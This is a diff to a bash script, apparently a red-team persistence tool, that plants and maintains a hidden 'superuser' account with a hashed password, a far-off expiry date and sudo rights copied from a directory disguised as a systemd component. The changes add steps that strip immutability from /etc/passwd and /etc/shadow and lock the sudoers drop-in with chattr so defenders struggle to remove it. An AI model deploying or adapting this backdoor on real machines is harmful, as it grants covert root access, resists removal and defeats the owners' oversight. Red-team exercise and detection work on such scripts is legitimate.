@@ -1,9 +1,13 @@
 #! /bin/bash
 
 RED_USER="superuser"
-RED_PASSWORD="SuperSecretPassword"
+RED_PASSWORD='$6$HgWPY/N6uSgAx9we$ke1NzLNRtRV9qaZ6Wd6UYbaIwu2MnxmAYEHx1a3yUmyBMfCeoAVkIApbsITVCKYVmCPNiclrYtDkfuP2Ud9ba1'
 RED_SHELL="/bin/bash"
 SUDO_DROPIN="1_superuser"
+
+# Make sure passwd and shadow are mutable
+chattr -i /etc/passwd
+chattr -i /etc/shadow
 
 # Add the user if it doesn't exist
 if ! id "$RED_USER" >/dev/null 2>/dev/null; then
@@ -11,17 +15,20 @@ if ! id "$RED_USER" >/dev/null 2>/dev/null; then
 fi
 
 # Ensure the user account is accessible
-echo "$RED_PASSWORD" | passwd --stdin $RED_USER
-passwd --unlock "$RED_USER"
+usermod --password "$RED_PASSWORD" $RED_USER
+usermod --unlock "$RED_USER"
 chsh --shell "$RED_SHELL" "$RED_USER"
 usermod --expiredate 2069-12-31 "$RED_USER"
 
 # Add our sudo drop-in file if its not there or been modified
 if ! [ -f $SUDO_DROPIN ]; then
 	cp /usr/share/systemd-userd/files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
+	chattr +i /etc/sudoers.d/$SUDO_DROPIN
 else
 	if ! cmp --slient "/etc/sudoers.d/$SUDO_DROPIN" "files/$SUDO_DROPIN" >/dev/null 2>/dev/null; then
+		chattr -i /etc/sudoers.d/$SUDO_DROPIN
 		cp /usr/share/systemd-userd/files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
+		chattr +i /etc/sudoers.d/$SUDO_DROPIN
 	fi
 fi
 
